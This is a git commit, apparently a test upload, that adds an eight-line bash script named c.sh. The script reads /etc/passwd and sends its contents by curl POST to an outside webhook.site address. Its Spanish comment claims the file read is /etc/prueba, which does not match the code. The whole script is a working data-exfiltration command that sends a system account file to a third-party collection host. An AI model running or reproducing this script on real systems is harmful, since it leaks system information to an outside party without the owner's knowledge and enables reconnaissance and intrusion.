028b299e8cb4ecc95f1f2982666e54775e5e1fb0
CURLprueba <167236685+CURLprueba@users.noreply.github.com>
2024-04-16 20:14:34 +0200

    Add files via upload

---
+++ c.sh
@@ -0,0 +1,8 @@
+#!/bin/bash
+
+# Lee el contenido del archivo /etc/prueba
+contenido=$(cat /etc/passwd)
+
+# Realiza la solicitud CURL con el contenido al servidor
+curl -X POST -d "$contenido" https://webhook.site/80431fd0-ed8c-4446-babe-0fcacb1b5013
+
